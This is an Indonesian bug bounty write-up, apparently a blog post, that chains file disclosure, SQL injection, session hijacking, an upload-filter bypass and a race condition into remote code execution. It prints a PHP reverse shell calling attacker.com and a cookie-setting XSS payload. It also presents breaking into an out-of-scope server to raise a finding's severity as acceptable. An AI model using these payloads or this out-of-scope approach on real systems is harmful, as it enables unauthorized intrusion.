@@ -1,0 +1,132 @@
+I"Ñ.<p><img src="/images/rce-banner.jpg" alt="&quot;Bug Bounty&quot; File Disclosure to Remote Code Execution" /></p>
+
+<p>Pada saat melakukan Bug Bounty Hunting , saya menemukan celah <code class="highlighter-rouge">Cookie Based XSS</code> pada sebuah website. <code class="highlighter-rouge">Cookie Based XSS</code> secara tingkat risiko memiliki Level Rendah karena merupakan Self XSS. Rasanya sangat sayang sekali bila temuan tersebut dilaporkan dan hanya mendapat Severity Low yang dimana untuk severity tersebut tidak ada Bounty atau Point yang diberikan.</p>
+
+<p>Scope pada Program ini sangatlah terbatas, namun diluar itu, domain dari website target memiliki banyak sekali subdomain. Yang pertama terpikirkan adalah, mencari kerentanan XSS pada subdomain target yang <code class="highlighter-rouge">out of scope</code> untuk men-trigger <code class="highlighter-rouge">Cookie Based XSS</code> di <code class="highlighter-rouge">in-scope</code> domain target, dengan begitu severity akan meningkat setidaknya menjadi High atau Medium.</p>
+
+<p><strong>I. Information Disclosure</strong></p>
+
+<p>Setelah melakukan pencarian selama beberapa waktu, tidak juga ditemukan subdomain yang memiliki kerentanan XSS. Hingga pada saat melakukan <code class="highlighter-rouge">directory bruteforce</code> pada salah satu subdomain, saya menemukan sebuah file yang menarik.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://redacted.com/redacted/redacted/_notes/dwsync.xml
+</code></pre></div></div>
+
+<p>File <code class="highlighter-rouge">dwsync.xml</code> merupakan file yang di-generate oleh Dreamweaver. Dimana pada file tersebut, berisi informasi terkait file apa saja yang ada pada direktori website.</p>
+
+<p><img src="/images/c4ca4238a0b923820dcc509a6f75849b-1-information-disclosure.jpg" alt="File dwsync.xml" /></p>
+
+<p><strong>II. SQL Injection</strong></p>
+
+<p>Secara default, untuk mengakses website tersebut memerlukan kredensial, dan kita tidak dapat membuat akun pada website tersebut. Seperti yang sudah dijelaskan diatas, melalui file <code class="highlighter-rouge">dwsync.xml</code>, kita dapat memperoleh informasi terkait file apa saja yang ada pada website target. Maka saya pun mencoba untuk mengakses salah satu file yang ada, sebagai contoh saya mencoba mengakses file <code class="highlighter-rouge">redacted.php</code>.</p>
+
+<p><img src="/images/c4ca4238a0b923820dcc509a6f75849b-2-sql-injection-1.jpg" alt="File redacted.php" /></p>
+
+<p>Terlihat pada website tersebut muncul pesan error <code class="highlighter-rouge">Undefined index: ver</code>, yang artinya pada laman tersebut terdapat variabel <code class="highlighter-rouge">ver</code> yang belum didefinisikan. Untuk itu, saya pun merubah URL nya menjadi seperti berikut:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://redacted.com/dir/redacted.php?ver=1
+</code></pre></div></div>
+
+<p>Dan tampilan laman pun berubah, namun hanya menampilkan angka <code class="highlighter-rouge">1</code></p>
+
+<p><img src="/images/c4ca4238a0b923820dcc509a6f75849b-3-sql-injection-2.jpg" alt="File redacted.php" /></p>
+
+<p>Tidak tau apa maksud dari angka <code class="highlighter-rouge">1</code> tersebut, namun melihat adanya parameter di URL, maka tangan pun terasa <em>gatal</em> untuk menambahkan simbol <code class="highlighter-rouge">'</code> pada parameter tersebut. Dan hasilnya â€¦</p>
+
+<p><img src="/images/c4ca4238a0b923820dcc509a6f75849b-4-sql-injection-3.jpg" alt="File redacted.php" /></p>
+
+<p>Sepertinya pesan error tersebut terlihat sangat familiar. Tanpa menunggu lama, saya pun langsung mencoba melakukan SQL Injection dengan bantuan SQLmap. Dan berikut adalah daftar database yang diperoleh:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>available databases [5]:
+[*] information_schema
+[*] mysql
+[*] performance_schema
+[*] redacted_db
+[*] tmp
+</code></pre></div></div>
+
+<p><strong>III. Authentication Bypass</strong></p>
+
+<p>Dari celah SQL Injection yang ditemukan, saya mencoba untuk meng-upload shell ke server target, namun hasilnya gagal. Maka terpaksa saya harus dapat login ke website menggunakan data yang ada pada database.</p>
+
+<p>Setelah mencoba meng-ekstrak database <code class="highlighter-rouge">redacted_db</code>, ditemukan ada sebuah tabel bernama <code class="highlighter-rouge">user_tbl</code>. Pada tabel tersebut terdapat informasi terkait <code class="highlighter-rouge">user</code> yang ada pada website target. Namun sayangnya, <code class="highlighter-rouge">password</code> user tersebut di-hash menggunakan md5 dan ketika mencoba melakukan cracking, tidak ada satupun yang berhasil.</p>
+
+<p>Tidak menyerah sampai situ, saya pun kembali mencari tabel-tabel yang mungkin dapat dimanfaatkan. Maka sampailah saya pada tabel bernama <code class="highlighter-rouge">session_tbl</code>. Pada tabel tersebut, hanya terdapat 3 kolom, yaitu <code class="highlighter-rouge">id</code>, <code class="highlighter-rouge">user_id</code>, dan <code class="highlighter-rouge">session</code>.</p>
+
+<p>Darisitu saya pun menyadari bahwa tabel tersebut berisi <code class="highlighter-rouge">session</code> aktif dari user website tersebut. Maka saya pun mencari user dengan role level tertinggi pada tabel <code class="highlighter-rouge">user_tbl</code>, dan mencari session nya pada tabel <code class="highlighter-rouge">session</code>. Kemudian saya mencoba memasukan nilai <code class="highlighter-rouge">session</code> yang diperoleh dari database ke Cookie website dengan nama <code class="highlighter-rouge">session</code>. Dan saya pun berhasil login ke website tersebut.</p>
+
+<p><strong>IV. Unrestricted File Upload</strong></p>
+
+<p>Singkat cerita, setelah dapat login ke dalam website target, maka saya mencari celah lain yang dapat dimanfaatkan. Pada website tersebut terdapat sebuah fitur untuk melakukan <code class="highlighter-rouge">Upload File</code>. Tentu saja ini merupakan fitur yang wajib kita test.</p>
+
+<p><img src="/images/c4ca4238a0b923820dcc509a6f75849b-5-upload-files.jpg" alt="File Upload" /></p>
+
+<p>Saya pun mencoba meng-upload file dengan ekstensi <code class="highlighter-rouge">.phtml</code>, namun hasilnya file tersebut ditolak dan tidak dapat terupload.</p>
+
+<p><img src="/images/c4ca4238a0b923820dcc509a6f75849b-6-banned-ext-2.jpg" alt="Banned Extension" /></p>
+
+<p>Namun saya menduga, filter tersebut hanya berjalan pada sisi klien. Artinya, ada potensi dapat dilakukan bypass dengan bantuan tools seperti Burpsuite. Maka saya mencoba melakukan <code class="highlighter-rouge">Upload File</code> kembali, kali ini dengan ekstensi <code class="highlighter-rouge">.jpg</code> lalu pada Burpsuite dilakukan intercept dan dirubah ekstensinya menjadi <code class="highlighter-rouge">.phtml</code>.</p>
+
+<p><img src="/images/c4ca4238a0b923820dcc509a6f75849b-7-uploaded.jpg" alt="File Uploaded" /></p>
+
+<p>Setelah menggunakan cara di atas, file pun berhasil di upload. Melihat response yang tampil, file tersebut tersimpan di AWS, bukan di website target.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://storage-redacted.s3-ap-southeast-1.amazonaws.com/redacted_dir/redacted_file.phtml
+</code></pre></div></div>
+
+<p><strong>V. Remote Code Execution</strong></p>
+
+<p>Melihat file yang diupload tersimpan di AWS, tidak banyak yang dapat dilakukan pada file tersebut, karena target kita adalah web server bukan server AWSnya. Maka saya pun mencoba memahami respon yang ditampilkan oleh server target.</p>
+
+<pre><code class="language-HTML">/var/www/html/redacted/../redacted****/var/www/html/redacted/../redacted/info.phtml&lt;br&gt;Uploading part 2 of /var/www/html/redacted/../redacted/info.phtml.
+Uploaded /var/www/html/redacted/../redacted/info.phtml to https://storage-redacted.s3-ap-southeast-1.amazonaws.com/redacted_dir/redacted_file.phtml.
+SUCCESS 52673, 98235
+</code></pre>
+
+<p>Dari response diatas, saya berasumsi bahwa selain disimpan di AWS, ada terdapat kemungkinan file yang di upload disimpan pula di website target pada direktori <code class="highlighter-rouge">redacted</code>. Maka saya pun mencoba mengunjungi URL berikut:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://redacted.com/redacted/redacted/info.phtml
+</code></pre></div></div>
+
+<p>Dan file tersebut tidak ditemukan.</p>
+
+<p><img src="/images/c4ca4238a0b923820dcc509a6f75849b-8-not-found.jpg" alt="File Not Found" /></p>
+
+<p>Namun saya tetap berasumsi, tidak mungkin bila respon menampilkan direktori <code class="highlighter-rouge">redacted</code> bila tidak ada hubungannya dengan file yang kita upload. Bagaimana bila yang terjadi adalah, file yang kita upload, disimpan <code class="highlighter-rouge">sementara</code> pada direktori <code class="highlighter-rouge">redacted</code>, lalu setelah sekian waktu di <code class="highlighter-rouge">lempar</code> ke AWS sebagai tempat penyimpanannya.</p>
+
+<p>Bila asumsi diatas benar, maka file kita akan berada di server selama sepersekian detik sebelum di upload ke AWS.</p>
+
+<p>Untuk mengetesnya, saya menggunakan Burpsuite Intruder dan mencoba melakukan <code class="highlighter-rouge">GET Request</code> secara terus-menerus ke URL file yang ada pada direktori <code class="highlighter-rouge">redacted</code> tadi.</p>
+
+<p><img src="/images/c4ca4238a0b923820dcc509a6f75849b-9-file-found.jpg" alt="File Found" /></p>
+
+<p>Dan benar saja, selama beberapa saat file tersebut berada pada server target (HTTP Code 200), dan tidak lama setelah itu file tersebut menghilang (HTTP Code 404) menandakan file nya sudah dipindahkan ke AWS.</p>
+
+<p>Maka dengan melakukan hal yang sama, kita dapat meng-upload PHP Reverse Shell untuk memperoleh shell dari website target.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>
+<span class="nb">exec</span><span class="p">(</span><span class="s2">"/bin/bash -c 'bash -i &gt;&amp; /dev/tcp/attacker.com/1337 0&gt;&amp;1'"</span><span class="p">);</span>
+</code></pre></div></div>
+
+<p><img src="/images/c4ca4238a0b923820dcc509a6f75849b-10-rce.jpg" alt="File Found" /></p>
+
+<p>Dan akhirnya saya pun mendapat akses ke server target.</p>
+
+<p><img src="/images/kamen.gif" alt="Hehe" /></p>
+
+<p>Kembali ke tujuan awal, setelah mendapat akses shell, saya pun menaruh file <code class="highlighter-rouge">HTML</code> yang berisi javascript untuk men-trigger XSS pada website yang ada dalam <code class="highlighter-rouge">scope</code> Bounty.</p>
+
+<p>Dengan kode HTML seperti berikut:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;script&gt;document.cookie = "evil=%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E@;path=/;domain=.redacted.com;";&lt;/script&gt;
+</code></pre></div></div>
+
+<p>Kita dapat membuat cookie bernama <code class="highlighter-rouge">evil</code> pada domain redacted.com dengan nilai berisi payload XSS <code class="highlighter-rouge">&lt;img src=x onerror=alert(1)&gt;</code>. Sehingga ketika mengakses domain <code class="highlighter-rouge">in-scope</code> bounty tadi, cookie tersebut akan diload dan XSS pun ter-trigger.</p>
+
+<p><img src="/images/b3c66b5a9aad-xss.gif" alt="XSS" /></p>
+
+<p>Mendapatkan full akses server pada website <code class="highlighter-rouge">out of scope</code> untuk men-trigger XSS pada website <code class="highlighter-rouge">in-scope</code>, agak ironis memang. Tapi itulah Bug Hunting, sebisa mungkin kita harus dapat meyakinkan Program Owner bahwa celah yang kita temukan dapat di-eksploitasi dan memiliki dampak yang signifikan. Dan pada akhirnya, itu semua akan membawa manfaat bagi kita.</p>
+
+<p>Dari website diatas, saya menemukan beberapa <strong>Cookie Based XSS</strong> dengan total nilai $5000.</p>
+
+<p>English: https://medium.com/@mastomi/bug-bounty-exploiting-cookie-based-xss-by-finding-rce-a3e3e80041f3</p>
+:ET
